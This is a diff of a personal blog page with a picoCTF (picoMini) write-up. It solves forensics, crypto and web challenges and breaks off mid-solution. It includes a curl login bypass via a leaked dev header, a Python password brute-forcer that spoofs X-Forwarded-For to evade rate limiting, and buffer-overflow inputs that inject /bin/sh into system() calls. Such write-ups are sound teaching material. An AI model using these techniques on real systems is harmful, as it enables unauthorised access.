@@ -5,34 +5,63 @@
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <title>Solving picoMini by CMU-Africa</title>
 <script defer src="/prefetch.4aef6239e652.js"></script>
+<style>
+pre.m .vb::-webkit-scrollbar{display:none}
+@media (max-width: 619px) {
+  html{-webkit-text-size-adjust:100%;text-size-adjust:100%}
+  pre.m{white-space:normal}
+  pre.m>span{display:block;padding-right:16px}
+  pre.m .r{padding-left:calc(var(--i)*1ch + var(--h,0)*1ch);text-indent:calc(var(--h,0)*-1ch);overflow-wrap:anywhere}
+  pre.m .qm{display:none}
+  pre.m .vb{white-space:pre;overflow-x:auto;scrollbar-width:none;padding-right:0}
+  pre.m .rl{white-space:pre;overflow:hidden;padding-right:0}
+  pre.m .im{padding-left:calc(var(--i)*1ch)}
+  pre.m .im img{max-width:100%;height:auto;vertical-align:bottom}
+  pre.m .sep{text-align:center;word-spacing:2ch}
+  pre.m .dt,pre.m .nx{text-align:right}
+  pre.m .nx{padding-left:3ch}
+  pre.m .ta{display:flex;flex-wrap:wrap;align-items:flex-end;align-items:last baseline;column-gap:2ch;padding-left:calc(var(--i)*1ch)}
+  pre.m .ta>b{flex:1 1 12ch;min-width:0}
+  pre.m .ta>img{flex:none;width:calc(var(--w)*1px);max-width:34vw;height:auto}
+  pre.m .ta.rt{justify-content:space-between}
+  pre.m .ta.rt>b{flex:0 1 auto}
+  pre.m .ta.rt>img{max-width:40vw}
+  pre.m .ft{padding-left:3ch}
+  pre.m .ft img{width:calc(var(--w)*1px);max-width:40vw;height:auto;margin-right:2ch}
+  pre.m .g1{margin-top:1lh}
+  pre.m .g2{margin-top:2lh}
+  pre.m .g3{margin-top:3lh}
+  pre.m .g4{margin-top:4lh}
+}
+</style>
 </head>
 <body>
 <pre>   <a href="/">&lt;- back</a></pre>
-<pre>
+<pre class="m">
 
-   <img src="/art/c-solving-picomini-by-cmu-africa.png" width="140" height="156" alt=""> <b>Solving picoMini by CMU-Africa</b>
-                                                                 5 oct 2025
+<span class="ta" style="--i:3;--w:140">   <img src="/art/c-solving-picomini-by-cmu-africa.png" width="140" height="156" alt=""> <b>Solving picoMini by CMU-Africa</b></span>
+<span class="dt">                                                                 5 oct 2025</span>
 
 
-   A friend recommended <a href="https://picoctf.org">picoCTF</a> to me. I had played similar games like
+<span class="r g2" style="--i:3">   A friend recommended <a href="https://picoctf.org">picoCTF</a> to me. I had played similar games like
    <a href="https://overthewire.org/wargames/bandit/">banditOverTheWire</a> before, so I thought it would be pretty fun to try
-   out.
+   out.</span>
 
 
-                                    *   *   *
+<span class="sep g2">                                    *   *   *</span>
 
 
-   <b>## Log Hunt</b>
-   -----------
+<span class="r g2" style="--i:3">   <b>## Log Hunt</b></span>
+<span class="rl">   -----------</span>
 
-   Our server seems to be leaking pieces of a secret flag in its logs. The
+<span class="r g1" style="--i:3">   Our server seems to be leaking pieces of a secret flag in its logs. The
    parts are scattered and sometimes repeated. Can you reconstruct the
    original flag? Download the logs and figure out the full flag from the
-   fragments.
+   fragments.</span>
 
-   - The `server.log` file contains thousands of lines of codes:
+<span class="r g1" style="--i:3;--h:2">   - The `server.log` file contains thousands of lines of codes:</span>
 
-   .-----------------------------------------------------------------------
+<span class="vb g1">   .-----------------------------------------------------------------------
    | [1990-08-09 10:00:10] INFO FLAGPART: picoCTF{us3_
    | [1990-08-09 10:00:16] WARN Disk space low
    | [1990-08-09 10:00:19] DEBUG Cache cleared
@@ -41,14 +70,14 @@
    | [1990-08-09 10:00:33] WARN Disk space low
    | [1990-08-09 10:00:38] ERROR Connection lost
    | [1990-08-09 10:00:46] ERROR Failed login attempt
-   '-----------------------------------------------------------------------
+   '-----------------------------------------------------------------------</span>
 
-   This seems to be pretty easy, the flag is just contained in logs tagged
-   with: `INFO FLAGPART`
+<span class="r g1" style="--i:3">   This seems to be pretty easy, the flag is just contained in logs tagged
+   with: `INFO FLAGPART`</span>
 
-   Performing a `grep`, we easily find the flag:
+<span class="r g1" style="--i:3">   Performing a `grep`, we easily find the flag:</span>
 
-   .-----------------------------------------------------------------------
+<span class="vb g1">   .-----------------------------------------------------------------------
    | zimengx@endeavour ~/S/p/C/LogHunt&gt; grep "FLAGPART" server.log
    | [1990-08-09 10:00:10] INFO FLAGPART: picoCTF{us3_
    | [1990-08-09 10:02:55] INFO FLAGPART: y0urlinux_
@@ -77,24 +106,24 @@
    | [1990-08-09 12:28:45] INFO FLAGPART: cedfa5fb}
    | [1990-08-09 12:28:49] INFO FLAGPART: cedfa5fb}
    | [1990-08-09 12:28:52] INFO FLAGPART: cedfa5fb}
-   '-----------------------------------------------------------------------
+   '-----------------------------------------------------------------------</span>
 
 
-                                    *   *   *
+<span class="sep g2">                                    *   *   *</span>
 
 
-   <b>## Riddle Registry</b>
-   ------------------
+<span class="r g2" style="--i:3">   <b>## Riddle Registry</b></span>
+<span class="rl">   ------------------</span>
 
-   Hi, intrepid investigator! 📄🔍 You've stumbled upon a peculiar PDF
+<span class="r g1" style="--i:3">   Hi, intrepid investigator! 📄🔍 You've stumbled upon a peculiar PDF
    filled with what seems like nothing more than garbled nonsense. But
    beware! Not everything is as it appears. Amidst the chaos lies a hidden
    treasure—an elusive flag waiting to be uncovered. Find the PDF file here
-   Hidden Confidential Document and uncover the flag within the metadata.
+   Hidden Confidential Document and uncover the flag within the metadata.</span>
 
-   Running `exiftool` to extract the metadata,
+<span class="r g1" style="--i:3">   Running `exiftool` to extract the metadata,</span>
 
-   .-----------------------------------------------------------------------
+<span class="vb g1">   .-----------------------------------------------------------------------
    | zimengx@endeavour ~/S/p/C/RiddleRegistry&gt; exiftool confidential.pdf
    | ExifTool Version Number         : 13.36
    | File Name                       : confidential.pdf
@@ -113,33 +142,33 @@
    | Producer                        : PyPDF2
    | Author                          : cGljb0NURntwdXp6bDNkX20zdGFkYXRhX2 \
    |   YwdW5kIV8zNTc4NzM5YX0=
-   '-----------------------------------------------------------------------
+   '-----------------------------------------------------------------------</span>
 
-   The `Author` field contains what is almost certainly base64 encoded
-   text, decoding it should give us the flag:
+<span class="r g1" style="--i:3">   The `Author` field contains what is almost certainly base64 encoded
+   text, decoding it should give us the flag:</span>
 
-   .-----------------------------------------------------------------------
+<span class="vb g1">   .-----------------------------------------------------------------------
    | zimengx@endeavour ~/S/p/C/RiddleRegistry&gt; echo                       \
    |   "cGljb0NURntwdXp6bDNkX20zdGF
    | kYXRhX2YwdW5kIV8zNTc4NzM5YX0=" | base64 --decode
    | picoCTF{puzzl3d_m3tadata_f0und!_3578739a}
-   '-----------------------------------------------------------------------
+   '-----------------------------------------------------------------------</span>
 
 
-                                    *   *   *
+<span class="sep g2">                                    *   *   *</span>
 
 
-   <b>## Corrupted File</b>
-   -----------------
+<span class="r g2" style="--i:3">   <b>## Corrupted File</b></span>
+<span class="rl">   -----------------</span>
 
-   This file seems broken... or is it? Maybe a couple of bytes could make
+<span class="r g1" style="--i:3">   This file seems broken... or is it? Maybe a couple of bytes could make
    all the difference. Can you figure out how to bring it back to life?
-   Download the file here.
+   Download the file here.</span>
 
-   Hints tell us the file is a JPG. The header of the JPG is likely
-   corrupt. JPGs start with `FF D8 FF` Using `hexedit`:
+<span class="r g1" style="--i:3">   Hints tell us the file is a JPG. The header of the JPG is likely
+   corrupt. JPGs start with `FF D8 FF` Using `hexedit`:</span>
 
-   .-----------------------------------------------------------------------
+<span class="vb g1">   .-----------------------------------------------------------------------
    | 00000000   5C 78 FF E0  00 10 4A 46  49 46 00 01  01 00 00 01        \
    |   \x....JFIF......
    | 00000010   00 01 00 00  FF DB 00 43  00 08 06 06  07 06 05 08        \
@@ -150,34 +179,34 @@
    |   ........... $.'
    | 00000040   22 2C 23 1C  1C 28 37 29  2C 30 31 34  34 34 1F 27  ",    \
    |   #..(7),01444.'
-   '-----------------------------------------------------------------------
+   '-----------------------------------------------------------------------</span>
 
-   Correcting the first two blocks to `FF D8` restores the JPG!
+<span class="r g1" style="--i:3">   Correcting the first two blocks to `FF D8` restores the JPG!</span>
 
-   <a href="/media/fcd447b1859e998d860e245f.jpg"><img src="/media/fcd447b1859e998d860e245f.jpg" width="560" height="350" alt=""></a>
-
-
-                                    *   *   *
+<span class="im g1" style="--i:3">   <a href="/media/fcd447b1859e998d860e245f.jpg"><img src="/media/fcd447b1859e998d860e245f.jpg" width="560" height="350" alt=""></a></span>
 
 
-   <b>## Crack the Gate 1</b>
-   -------------------
+<span class="sep g2">                                    *   *   *</span>
 
-   We’re in the middle of an investigation. One of our persons of interest,
+
+<span class="r g2" style="--i:3">   <b>## Crack the Gate 1</b></span>
+<span class="rl">   -------------------</span>
+
+<span class="r g1" style="--i:3">   We’re in the middle of an investigation. One of our persons of interest,
    ctf player, is believed to be hiding sensitive data inside a restricted
    web portal. We’ve uncovered the email address he uses to log in:
    <a href="mailto:ctf-player@picoctf.org">ctf-player@picoctf.org</a>. Unfortunately, we don’t know the password, and
    the usual guessing techniques haven’t worked. But something feels off...
    it’s almost like the developer left a secret way in. Can you figure it
-   out? The website is running here. Can you try to log in?
+   out? The website is running here. Can you try to log in?</span>
 
-   We are presented with a login scren:
+<span class="r g1" style="--i:3">   We are presented with a login scren:</span>
 
-   <a href="/media/a54ef792020bfe355da2a955.png"><img src="/media/a54ef792020bfe355da2a955.png" width="560" height="478" alt=""></a>
+<span class="im g1" style="--i:3">   <a href="/media/a54ef792020bfe355da2a955.png"><img src="/media/a54ef792020bfe355da2a955.png" width="560" height="478" alt=""></a></span>
 
-   Upon inspection, we see the way the form handles passwords:
+<span class="r g1" style="--i:3">   Upon inspection, we see the way the form handles passwords:</span>
 
-   .-----------------------------------------------------------------------
+<span class="vb g1">   .-----------------------------------------------------------------------
    | &lt;/head&gt;
    | &lt;body&gt;
    |  &lt;!-- ABGR: Wnpx - grzcbenel olcnff: hfr urnqre "K-Qri-Npprff: lrf"  \
@@ -229,24 +258,24 @@
    |
    | &lt;/body&gt;
    | &lt;/html&gt;
-   '-----------------------------------------------------------------------
+   '-----------------------------------------------------------------------</span>
 
-   We see a comment that is "supposed to be removed before pushng to
-   production" LOL! It might be the flag or the password.
+<span class="r g1" style="--i:3">   We see a comment that is "supposed to be removed before pushng to
+   production" LOL! It might be the flag or the password.</span>
 
-   .-----------------------------------------------------------------------
+<span class="vb g1">   .-----------------------------------------------------------------------
    | &lt;!-- ABGR: Wnpx - grzcbenel olcnff: hfr urnqre "K-Qri-Npprff: lrf" --&gt;
    | &lt;!-- Remove before pushing to production! --&gt;
-   '-----------------------------------------------------------------------
+   '-----------------------------------------------------------------------</span>
 
-   Hint #2 tells us this is a ROT13 cipher:
+<span class="r g1" style="--i:3">   Hint #2 tells us this is a ROT13 cipher:</span>
 
-   > A common trick is to rotate each letter by 13 positions in the
-   > alphabet.
+<span class="r g1" style="--i:3;--h:2">   > A common trick is to rotate each letter by 13 positions in the
+   <span class="qm">> </span>alphabet.</span>
 
-   Writing a simple python script to perform a ROT13 decode:
+<span class="r g1" style="--i:3">   Writing a simple python script to perform a ROT13 decode:</span>
 
-   .-----------------------------------------------------------------------
+<span class="vb g1">   .-----------------------------------------------------------------------
    | string = """ &lt;!-- ABGR: Wnpx - grzcbenel olcnff: hfr urnqre          \
    |   "K-Qri-Npprff: lrf" --&gt;"""
    |
@@ -262,19 +291,19 @@
    |
    | decoded = rot13(string)
    | print(decoded)
-   '-----------------------------------------------------------------------
+   '-----------------------------------------------------------------------</span>
 
-   .-----------------------------------------------------------------------
+<span class="vb g1">   .-----------------------------------------------------------------------
    | zimengx@endeavour ~/S/p/C/CrackTheGate1&gt; python3 decode.py
    |  &lt;!-- NOTE: Jack - temporary bypass: use header "X-Dev-Access: yes"  \
    |    --&gt;
-   '-----------------------------------------------------------------------
+   '-----------------------------------------------------------------------</span>
 
-   We see a development note left to "Jack" to use X-Dev-Access when
+<span class="r g1" style="--i:3">   We see a development note left to "Jack" to use X-Dev-Access when
    sending the POST request to bypass the login. We know the endpoint is
-   `/login` from the HTML before.
+   `/login` from the HTML before.</span>
 
-   .-----------------------------------------------------------------------
+<span class="vb g1">   .-----------------------------------------------------------------------
    | zimengx@endeavour ~/S/p/C/CrackTheGate1&gt; curl -X POST \
    |                                                -H "Content-Type:     \
    |                         application/json" \
@@ -286,64 +315,64 @@
    |                         del.picoctf.net:52352/login
    | {"success":true,"email":"ctf-player@picoctf.org","firstName":"pico", \
    |   "lastName":"player","flag":"picoCTF{brut4_f0rc4_125f752d}"}⏎
-   '-----------------------------------------------------------------------
+   '-----------------------------------------------------------------------</span>
 
-   Yay!!
-
-
-                                    *   *   *
+<span class="r g1" style="--i:3">   Yay!!</span>
 
 
-   <b>## Flag in Flame</b>
-   ----------------
+<span class="sep g2">                                    *   *   *</span>
 
-   The SOC team discovered a suspiciously large log file after a recent
+
+<span class="r g2" style="--i:3">   <b>## Flag in Flame</b></span>
+<span class="rl">   ----------------</span>
+
+<span class="r g1" style="--i:3">   The SOC team discovered a suspiciously large log file after a recent
    breach. When they opened it, they found an enormous block of encoded
    text instead of typical logs. Could there be something hidden within?
    Your mission is to inspect the resulting file and reveal the real
    purpose of it. The team is relying on your skills to uncover any
    concealed information within this unusual log. Download the encoded data
    here: Logs Data. Be prepared—the file is large, and examining it
-   thoroughly is crucial
+   thoroughly is crucial</span>
 
-   Hints tell us the file is base64 encoded and is a image, thats
-   straightforward enough.
+<span class="r g1" style="--i:3">   Hints tell us the file is base64 encoded and is a image, thats
+   straightforward enough.</span>
 
-   > Use base64 to decode the data and generate the image file.
+<span class="r g1" style="--i:3;--h:2">   > Use base64 to decode the data and generate the image file.</span>
 
-   .-----------------------------------------------------------------------
+<span class="vb g1">   .-----------------------------------------------------------------------
    | zimengx@endeavour ~/S/p/C/FlagInFlame&gt; echo logs.txt | base64 --decode
    | ��,base64: invalid input
-   '-----------------------------------------------------------------------
+   '-----------------------------------------------------------------------</span>
 
-   Looks like the file isn't in b64, maybe hex then?
+<span class="r g1" style="--i:3">   Looks like the file isn't in b64, maybe hex then?</span>
 
-   .-----------------------------------------------------------------------
+<span class="vb g1">   .-----------------------------------------------------------------------
    | print(bytes.fromhex("7069636F43544678666F72656E736963735F616E616C797 \
    |   369735F69735F616D617A696E675F35636363376362307D").decode())
-   '-----------------------------------------------------------------------
+   '-----------------------------------------------------------------------</span>
 
-   .-----------------------------------------------------------------------
+<span class="vb g1">   .-----------------------------------------------------------------------
    | zimengx@endeavour ~/S/p/C/FlagInFlame [0|1]&gt; python3 attempt.py
    | picoCTFxforensics_analysis_is_amazing_5ccc7cb0}
-   '-----------------------------------------------------------------------
+   '-----------------------------------------------------------------------</span>
 
-   Yup!!
-
-
-                                    *   *   *
+<span class="r g1" style="--i:3">   Yup!!</span>
 
 
-   <b>## Hidden in Plainsight</b>
-   -----------------------
+<span class="sep g2">                                    *   *   *</span>
 
-   You’re given a seemingly ordinary JPG image. Something is tucked away
+
+<span class="r g2" style="--i:3">   <b>## Hidden in Plainsight</b></span>
+<span class="rl">   -----------------------</span>
+
+<span class="r g1" style="--i:3">   You’re given a seemingly ordinary JPG image. Something is tucked away
    out of sight inside the file. Your task is to discover the hidden
-   payload and extract the flag. Download the jpg image here.
+   payload and extract the flag. Download the jpg image here.</span>
 
-   Another image problem, first we check the metadata:
+<span class="r g1" style="--i:3">   Another image problem, first we check the metadata:</span>
 
-   .-----------------------------------------------------------------------
+<span class="vb g1">   .-----------------------------------------------------------------------
    | zimengx@endeavour ~/S/p/C/HiddenInPlainsight&gt; exiftool img.jpg
    | ExifTool Version Number         : 13.36
    | File Name                       : img.jpg
@@ -369,80 +398,80 @@
    | Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
    | Image Size                      : 640x640
    | Megapixels                      : 0.410
-   '-----------------------------------------------------------------------
+   '-----------------------------------------------------------------------</span>
 
-   Theres a comment! Looks b64:
+<span class="r g1" style="--i:3">   Theres a comment! Looks b64:</span>
 
-   .-----------------------------------------------------------------------
+<span class="vb g1">   .-----------------------------------------------------------------------
    | zimengx@endeavour ~/S/p/C/HiddenInPlainsight&gt; echo                   \
    |   "c3RlZ2hpZGU6Y0VGNmVuZHZjbVE9"
    |  | base64 --decode
    | steghide:cEF6endvcmQ=
-   '-----------------------------------------------------------------------
+   '-----------------------------------------------------------------------</span>
 
-   We get steghide and what looks to be another b64 string. Doing some
-   googling on steghide:
+<span class="r g1" style="--i:3">   We get steghide and what looks to be another b64 string. Doing some
+   googling on steghide:</span>
 
-   > Steghide is steganography program which hides bits of a data file in
-   > some of the least significant bits of another file in such a way that
-   > the existence of the data file is not visible and cannot be proven.
-   > Steghide is designed to be portable and configurable and features
-   > hiding data in bmp, jpeg, wav and au files, blowfish encryption, MD5
-   > hashing of passphrases to blowfish keys, and pseudo-random
-   > distribution of hidden bits in the container data. Steghide is useful
-   > in digital forensics investigations.
+<span class="r g1" style="--i:3;--h:2">   > Steghide is steganography program which hides bits of a data file in
+   <span class="qm">> </span>some of the least significant bits of another file in such a way that
+   <span class="qm">> </span>the existence of the data file is not visible and cannot be proven.
+   <span class="qm">> </span>Steghide is designed to be portable and configurable and features
+   <span class="qm">> </span>hiding data in bmp, jpeg, wav and au files, blowfish encryption, MD5
+   <span class="qm">> </span>hashing of passphrases to blowfish keys, and pseudo-random
+   <span class="qm">> </span>distribution of hidden bits in the container data. Steghide is useful
+   <span class="qm">> </span>in digital forensics investigations.</span>
 
-   Installing steghide (arch btw):
+<span class="r g1" style="--i:3">   Installing steghide (arch btw):</span>
 
-   .-----------------------------------------------------------------------
+<span class="vb g1">   .-----------------------------------------------------------------------
    | yay -S steghide
-   '-----------------------------------------------------------------------
+   '-----------------------------------------------------------------------</span>
 
-   And running `extract -sf` on the image:
+<span class="r g1" style="--i:3">   And running `extract -sf` on the image:</span>
 
-   .-----------------------------------------------------------------------
+<span class="vb g1">   .-----------------------------------------------------------------------
    | zimengx@endeavour ~/S/p/C/HiddenInPlainsight [1]&gt; steghide extract   \
    |   -sf img
    | Enter passphrase: ⏎
-   '-----------------------------------------------------------------------
+   '-----------------------------------------------------------------------</span>
 
-   We are prompted for a passphrase?? Maybe thats what was in the b64 text.
+<span class="r g1" style="--i:3">   We are prompted for a passphrase?? Maybe thats what was in the b64 text.</span>
 
-   Yup!
+<span class="r g1" style="--i:3">   Yup!</span>
 
-   .-----------------------------------------------------------------------
+<span class="vb g1">   .-----------------------------------------------------------------------
    | zimengx@endeavour ~/S/p/C/HiddenInPlainsight&gt; echo "cEF6endvcmQ=" |  \
    |   base64 --deco
    | de
    | pAzzword⏎
-   '-----------------------------------------------------------------------
+   '-----------------------------------------------------------------------</span>
 
-   .-----------------------------------------------------------------------
+<span class="vb g1">   .-----------------------------------------------------------------------
    | zimengx@endeavour ~/S/p/C/HiddenInPlainsight&gt; steghide extract -sf   \
    |   img.jpg --pass
    | phrase "pAzzword"
    | wrote extracted data to "flag.txt".
    | zimengx@endeavour ~/S/p/C/HiddenInPlainsight&gt; cat flag.txt
    | picoCTF{h1dd3n_1n_1m4g3_5d4cba73}
-   '-----------------------------------------------------------------------
+   '-----------------------------------------------------------------------</span>
 
-   Yay!
-
-
-                                    *   *   *
+<span class="r g1" style="--i:3">   Yay!</span>
 
 
-   <b>## Input Injection 1</b>
-   --------------------
+<span class="sep g2">                                    *   *   *</span>
 
-   A friendly program wants to greet you… but its goodbye might say more
+
+<span class="r g2" style="--i:3">   <b>## Input Injection 1</b></span>
+<span class="rl">   --------------------</span>
+
+<span class="r g1" style="--i:3">   A friendly program wants to greet you… but its goodbye might say more
    than it should. Can you convince it to reveal the flag? connect to the
    challenge instance nc saffron-estate.picoctf.net 61381. You can Download
-   the program file here. And source code
+   the program file here. And source code</span>
 
-   We get an executable binary and a `vuln.c` file:
+<span class="r g1" style="--i:3">   We get an executable binary and a `vuln.c` file:</span>
 
-   .-----------------------------------------------------------------------
+<span class="vb g1">   .-----------------------------------------------------------------------
    | #include &lt;string.h&gt;
    | #include &lt;stdio.h&gt;
    | #include &lt;stdlib.h&gt;
@@ -473,22 +502,22 @@
    |     fflush(stdout);
    |     system(c);
    | }
-   '-----------------------------------------------------------------------
+   '-----------------------------------------------------------------------</span>
 
-   Immediately, we see a `system(c)` call. We need to achieve injection
+<span class="r g1" style="--i:3">   Immediately, we see a `system(c)` call. We need to achieve injection
    into str `c`. `c` is copied from `cmd`. More importantly, `name` is of
-   length `200` while buffer is only of length `10`.
+   length `200` while buffer is only of length `10`.</span>
 
-   `buffer` is declared second, so it might be allocated at a higher memory
-   address.
+<span class="r g1" style="--i:3">   `buffer` is declared second, so it might be allocated at a higher memory
+   address.</span>
 
-   `c` is declared first, so it might be allocated at a lower memory
-   address, immediately below `buffer` on the stack.
+<span class="r g1" style="--i:3">   `c` is declared first, so it might be allocated at a lower memory
+   address, immediately below `buffer` on the stack.</span>
 
-   Given this scenario, we can write any length &gt;10 to name and achieve
-   code execution.
+<span class="r g1" style="--i:3">   Given this scenario, we can write any length &gt;10 to name and achieve
+   code execution.</span>
 
-   .-----------------------------------------------------------------------
+<span class="vb g1">   .-----------------------------------------------------------------------
    | zimengx@endeavour ~/S/p/C/InputInjection1&gt; nc                        \
    |   saffron-estate.picoctf.net 61381
    | What is your name?
@@ -498,26 +527,26 @@
    | flag.txt
    | cat flag.txt
    | picoCTF{0v3rfl0w_c0mm4nd_0995fed8}
-   '-----------------------------------------------------------------------
+   '-----------------------------------------------------------------------</span>
 
 
-                                    *   *   *
+<span class="sep g2">                                    *   *   *</span>
 
 
-   <b>## Crack the Gate 2</b>
-   -------------------
+<span class="r g2" style="--i:3">   <b>## Crack the Gate 2</b></span>
+<span class="rl">   -------------------</span>
 
-   The login system has been upgraded with a basic rate-limiting mechanism
+<span class="r g1" style="--i:3">   The login system has been upgraded with a basic rate-limiting mechanism
    that locks out repeated failed attempts from the same source. We’ve
    received a tip that the system might still trust user-controlled
    headers. Your objective is to bypass the rate-limiting restriction and
    log in using the known email address: <a href="mailto:ctf-player@picoctf.org">ctf-player@picoctf.org</a> and uncover
    the hidden secret. The website is running here. Can you try to log in?.
-   Download the passwords list here.
+   Download the passwords list here.</span>
 
-   We have a list of passwords and one is presumably correct
+<span class="r g1" style="--i:3">   We have a list of passwords and one is presumably correct</span>
 
-   .-----------------------------------------------------------------------
+<span class="vb g1">   .-----------------------------------------------------------------------
    | JiywhfQn
    | 3zSd0XU0
    | 50ylF3Uo
@@ -538,13 +567,13 @@
    | lVY5T9Ah
    | URgET2ph
    | 6epBnWRf
-   '-----------------------------------------------------------------------
+   '-----------------------------------------------------------------------</span>
 
-   However, we are told we would be raitimited if we come from the same IP
+<span class="r g1" style="--i:3">   However, we are told we would be raitimited if we come from the same IP
    Address. Hints tell us we can use the `X-forwarded-For` header to spoof
-   IPs.
+   IPs.</span>
 
-   .-----------------------------------------------------------------------
+<span class="vb g1">   .-----------------------------------------------------------------------
    | import requests
    | import json
    |
@@ -571,34 +600,34 @@
    |     if result.get("success"):
    |         print(result)
    |         break
-   '-----------------------------------------------------------------------
+   '-----------------------------------------------------------------------</span>
 
-   .-----------------------------------------------------------------------
+<span class="vb g1">   .-----------------------------------------------------------------------
    | zimengx@endeavour ~/S/p/C/CrackTheGate2&gt; python3 bypass.py
    | {'success': True, 'email': 'ctf-player@picoctf.org', 'firstName':    \
    |   'pico', 'lastName': 'player', 'flag':                              \
    |   'picoCTF{xff_byp4ss_brut3_ff36dbbc}'}
-   '-----------------------------------------------------------------------
+   '-----------------------------------------------------------------------</span>
 
-   Yay!
-
-
-                                    *   *   *
+<span class="r g1" style="--i:3">   Yay!</span>
 
 
-   <b>## Crack the Power</b>
-   ------------------
+<span class="sep g2">                                    *   *   *</span>
 
-   We received an encrypted message. The modulus is built from primes large
+
+<span class="r g2" style="--i:3">   <b>## Crack the Power</b></span>
+<span class="rl">   ------------------</span>
+
+<span class="r g1" style="--i:3">   We received an encrypted message. The modulus is built from primes large
    enough that factoring them isn’t an option, at least not today. See if
    you can make sense of the numbers and reveal the flag. Download the
-   message.
+   message.</span>
 
-   Ugh... We have a math problem.
+<span class="r g1" style="--i:3">   Ugh... We have a math problem.</span>
 
-   The message contains three variables: `n, e, c`
+<span class="r g1" style="--i:3">   The message contains three variables: `n, e, c`</span>
 
-   .-----------------------------------------------------------------------
+<span class="vb g1">   .-----------------------------------------------------------------------
    | n = 3402266122804538804909129276169226547458712440892893662567892125 \
    |   158960044972508885843358111938302998311529372217107305246076572748 \
    |   004398206572594583358459396049312084016451667944224210617532564186 \
@@ -637,32 +666,32 @@
    |   021389295409399779206900144794846699931593703143725511523695595061 \
    |   166749803145955473540856097123909633748499925243680484632333684127 \
    |   63016667750045491935391770001
-   '-----------------------------------------------------------------------
+   '-----------------------------------------------------------------------</span>
 
-   This looks like a RSA encryption key with N=modulus, E=Public Exponent,
-   and C=Cipher Text
+<span class="r g1" style="--i:3">   This looks like a RSA encryption key with N=modulus, E=Public Exponent,
+   and C=Cipher Text</span>
 
-   This is starting to get less straightforward than the other ones.
+<span class="r g1" style="--i:3">   This is starting to get less straightforward than the other ones.</span>
 
-   Hints tell us to use Coppersmith's attack for small messages. In
+<span class="r g1" style="--i:3">   Hints tell us to use Coppersmith's attack for small messages. In
    standard RSA, the ciphertext c is computed as c = mᵉ mod n. This
-   operation means we take the remainder after dividing by n.
+   operation means we take the remainder after dividing by n.</span>
 
-   This attack works when the message m is so small that mᵉ &lt; n When this
+<span class="r g1" style="--i:3">   This attack works when the message m is so small that mᵉ &lt; n When this
    condition holds, the modular reduction step is superfluous because the
-   result of the exponentiation is already smaller than the modulus.
+   result of the exponentiation is already smaller than the modulus.</span>
 
-   Since we are working with integers, this simplifies the problem to a
+<span class="r g1" style="--i:3">   Since we are working with integers, this simplifies the problem to a
    algebraic one. To recover m, we need to find the integer e-th root of
-   the ciphertext c. m = ᵉ√c We can do this with the `gmpy2` library
+   the ciphertext c. m = ᵉ√c We can do this with the `gmpy2` library</span>
 
-   > gmpy2 is a C-coded Python extension module that supports
-   > multiple-precision arithmetic. It is the successor to the original
-   > gmpy module (supported only the GMP library). gmpy2 adds support for
-   > the MPFR (correctly rounded real floating-point arithmetic) and MPC
-   > (correctly rounded complex floating-point arithmetic) libraries.
+<span class="r g1" style="--i:3;--h:2">   > gmpy2 is a C-coded Python extension module that supports
+   <span class="qm">> </span>multiple-precision arithmetic. It is the successor to the original
+   <span class="qm">> </span>gmpy module (supported only the GMP library). gmpy2 adds support for
+   <span class="qm">> </span>the MPFR (correctly rounded real floating-point arithmetic) and MPC
+   <span class="qm">> </span>(correctly rounded complex floating-point arithmetic) libraries.</span>
 
-   .-----------------------------------------------------------------------
+<span class="vb g1">   .-----------------------------------------------------------------------
    | import gmpy2
    |
    | n = 3402266122804538804909129276169226547458712440892893662567892125 \
@@ -716,30 +745,30 @@
    |   byteorder='big')
    |
    | plaintext = m_bytes.decode('ascii')
-   '-----------------------------------------------------------------------
+   '-----------------------------------------------------------------------</span>
 
-   .-----------------------------------------------------------------------
+<span class="vb g1">   .-----------------------------------------------------------------------
    | (.venv) zimengx@endeavour ~/S/p/C/CrackThePower&gt; python3 attack.py
    | picoCTF{t1ny_e_9b88056f}
-   '-----------------------------------------------------------------------
+   '-----------------------------------------------------------------------</span>
 
-   Phew, that was complicated.
-
-
-                                    *   *   *
+<span class="r g1" style="--i:3">   Phew, that was complicated.</span>
 
 
-   <b>## Input Injection 2</b>
-   --------------------
+<span class="sep g2">                                    *   *   *</span>
 
-   This program greets you and then runs a command. But can you take
+
+<span class="r g2" style="--i:3">   <b>## Input Injection 2</b></span>
+<span class="rl">   --------------------</span>
+
+<span class="r g1" style="--i:3">   This program greets you and then runs a command. But can you take
    control of what command it executes? Connect to the program with netcat:
    nc saffron-estate.picoctf.net 63308. You can Download the program file
-   here. And source code
+   here. And source code</span>
 
-   As before, we get a `vuln.c` and a binary executable;
+<span class="r g1" style="--i:3">   As before, we get a `vuln.c` and a binary executable;</span>
 
-   .-----------------------------------------------------------------------
+<span class="vb g1">   .-----------------------------------------------------------------------
    | #include &lt;stdio.h&gt;
    |
    | #include &lt;stdlib.h&gt;
@@ -780,13 +809,13 @@
    | return 0;
    |
    | }
-   '-----------------------------------------------------------------------
+   '-----------------------------------------------------------------------</span>
 
-   It is clear we need to overwrite the `shell` variable to achieve code
+<span class="r g1" style="--i:3">   It is clear we need to overwrite the `shell` variable to achieve code
    execution. Since these are made with `malloc`, we can simply overwrite
-   `username`, triggering a buffer overflow into `shell`.
+   `username`, triggering a buffer overflow into `shell`.</span>
 
-   .-----------------------------------------------------------------------
+<span class="vb g1">   .-----------------------------------------------------------------------
    | (.venv) zimengx@endeavour ~/S/p/C/CrackThePower [0|SIGINT]&gt; nc       \
    |   saffron-estate.picoctf.net 63308
    | username at 0xdd952a0
@@ -795,19 +824,19 @@
    |   aaa
    | Hello, aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.      \
    |   Your shell is aaaaaaa.
-   '-----------------------------------------------------------------------
+   '-----------------------------------------------------------------------</span>
 
-   Unlike `Input Injection 1`, we need to exactly overflow the right
+<span class="r g1" style="--i:3">   Unlike `Input Injection 1`, we need to exactly overflow the right
    amount, so I first tried a random string and noted how much over I went.
-   Then, we can craft the injection:
+   Then, we can craft the injection:</span>
 
-   .-----------------------------------------------------------------------
+<span class="vb g1">   .-----------------------------------------------------------------------
    | aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa - aaaaaaa =  \
    |   aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa + /bin/sh =       \
    |   aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa/bin/sh
